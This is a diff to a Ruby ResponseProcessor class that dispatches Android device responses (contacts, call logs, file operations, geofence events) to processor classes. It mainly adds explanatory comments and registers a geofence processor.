@@ -1,9 +1,19 @@
 # frozen_string_literal: true
 
-# Processes responses from Android devices and dispatches to specific processor classes
-# based on the PendingCommand's command type
+# Central dispatch hub for all device responses.
+#
+# When an Android device sends a response (via ActionCable or REST), this class:
+#   1. Extracts the payload from one of three possible envelope formats
+#      (data['payload'], data['data'], or the root hash itself).
+#   2. Routes heartbeats directly to HeartbeatMonitor (bypasses PendingCommand
+#      lookup since heartbeats are high-frequency and have no associated command).
+#   3. For all other responses, looks up the PendingCommand by request_id and
+#      delegates to a specialized processor class via the COMMAND_PROCESSORS registry.
+#   4. Marks the PendingCommand as failed if the command type has no registered
+#      processor or if an exception occurs during processing.
 class ResponseProcessor
-  # Command type to processor class mapping
+  # Registry mapping command type strings to their processor classes.
+  # Each processor must implement .new(pending_command, payload) and #process.
   COMMAND_PROCESSORS = {
     'get_contacts' => ContactsResponseProcessor,
     'get_call_logs' => CalllogsResponseProcessor,
@@ -24,12 +34,18 @@ class ResponseProcessor
     'preview_file' => FileBrowserResponseProcessor,
     'rename_file' => FileBrowserResponseProcessor,
     'move_file' => FileBrowserResponseProcessor,
-    'search_files' => FileBrowserResponseProcessor
+    'search_files' => FileBrowserResponseProcessor,
+    'geofence_event' => GeofenceResponseProcessor
   }.freeze
 
+  # Main entry point. Accepts a Hash from ActionCable or a controller.
+  # The payload may be wrapped in 'payload' or 'data' keys depending on
+  # whether it comes from CommandChannel, the REST ack endpoint, or a
+  # direct WebSocket message — hence the triple fallback extraction.
   def self.process(data)
     return unless data.is_a?(Hash)
     
+    # Normalize: devices may wrap the payload under different keys
     payload = data['payload'] || data['data'] || data
     
     # Handle heartbeat without requiring PendingCommand
@@ -73,6 +89,9 @@ class ResponseProcessor
 
   private
 
+  # Heartbeats are processed separately from commands because they are
+  # sent frequently (~every 15 s) and never have a corresponding PendingCommand.
+  # Updates are written to Redis (not PostgreSQL) to avoid write amplification.
   def self.process_heartbeat(payload)
     device_id = payload['device_id']
     
